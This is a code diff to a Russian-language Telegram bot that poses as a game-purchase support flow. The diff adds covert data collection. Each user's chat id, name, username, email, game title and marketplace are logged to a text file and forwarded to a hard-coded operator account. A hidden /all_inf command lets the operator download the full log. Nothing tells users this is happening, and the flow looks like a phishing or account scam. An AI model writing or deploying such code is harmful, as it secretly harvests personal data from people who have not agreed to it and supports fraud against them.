@@ -11,15 +11,18 @@ bot = Bot(token=API_TOKEN)
 storage = MemoryStorage()
 dp = Dispatcher(bot, storage=storage)
 
+# user_inf
+user_data = []
 
 # Jpg
-file_list1 = ['data/1.jpg', 'data/2.jpg', 'data/3.jpg', 'data/4.jpg', 'data/5.jpg', 'data/6.jpg', 'data/7.jpg', 'data/8.jpg', 'data/9.jpg']
+file_list1 = ['data/1.jpg', 'data/2.jpg', 'data/3.jpg',
+              'data/4.jpg', 'data/5.jpg', 'data/6.jpg',
+              'data/7.jpg', 'data/8.jpg', 'data/9.jpg']
+
 res_data1 = []
 for file in file_list1:
     with open(file, 'rb') as fl:
         res_data1.append(fl.read())
-
-
 
 file_list2 = ['data/10.jpg', 'data/11.jpg', 'data/12.jpg',
               'data/13.jpg', 'data/14.jpg', 'data/15.mp4',
@@ -36,6 +39,11 @@ for file in file_list2:
 @dp.message_handler(commands='start')
 async def start(message: types.Message):
     if str(message.chat.id) != config['Chat']['chat_id']:
+
+        user_data.append(str(message.chat.id))            # user id
+        user_data.append(str(message.chat.first_name))    # user firs_name
+        user_data.append(str(message.chat.username))      # user name
+
         await bot.send_photo(
             message.chat.id, res_data1[0],
             "🇷🇺️ Уважаемый {0.first_name} ❗\n"
@@ -81,7 +89,10 @@ async def mail_entry(call: types.CallbackQuery):
 @dp.message_handler(state=Form.mail)
 async def mail_handler(message: types.Message, state: FSMContext):
     email = message.text
+
     if is_valid_email(email):
+
+        user_data.append(str(email)) # user mail
 
         async with state.proxy() as data:
             data['mail'] = message.text
@@ -104,6 +115,9 @@ async def mail_handler(message: types.Message, state: FSMContext):
 @dp.message_handler(state=Form.game)
 async def game_handler(message: types.Message, state: FSMContext):
     game = message.text
+
+    user_data.append(str(game)) # user game
+
     await bot.send_photo(message.chat.id, res_data1[3],
                     "🇷🇺️Выберите площадку на которой приобретали ИГРУ👇️\n"
                     "---------------------------------\n"
@@ -113,6 +127,21 @@ async def game_handler(message: types.Message, state: FSMContext):
 
 @dp.callback_query_handler(text_contains='mr.')
 async def Shops(call):
+
+    user_data.append(str(call.data)) # user market
+
+    inf = ";".join(user_data)
+
+    with open("settings/user_data.txt", "a", encoding='utf-8') as file:
+        for  line in user_data:
+            file.write(line + ';')
+        file.write("\n")
+
+        await bot.send_message(config['meid']['id'], inf)
+
+        user_data.clear()
+
+
     await bot.send_photo(call.message.chat.id, res_data1[4],
                    "🇷🇺️ Передача аккаунта третьим лицам строго ЗАПРЕЩЕНА, \n"
                    "влечет за собой ограничение на дальнейшие покупки и доступ в аккаунт\n"
@@ -227,6 +256,19 @@ async def start(message: types.Message):
 
         await bot.restrict_chat_member(message.chat.id, message.from_id, types.ChatPermissions(False), until_date = 10)
 
+    elif message.text == "/all_inf":
+        if str(message.chat.id) == str(config['meid']['id']):
+            with open("settings/user_data.txt", "rb") as file:
+                await bot.send_document(config['meid']['id'], document=file)
+
+        else:
+            await bot.send_message(
+                message.chat.id,
+                "Вас разве это попросили сделать⁉️")
+
+            await bot.delete_message(message.chat.id, message.message_id)
+            await asyncio.sleep(5)
+            await bot.delete_message(message.chat.id, message.message_id + 1)
 
     else:
         await bot.send_message(
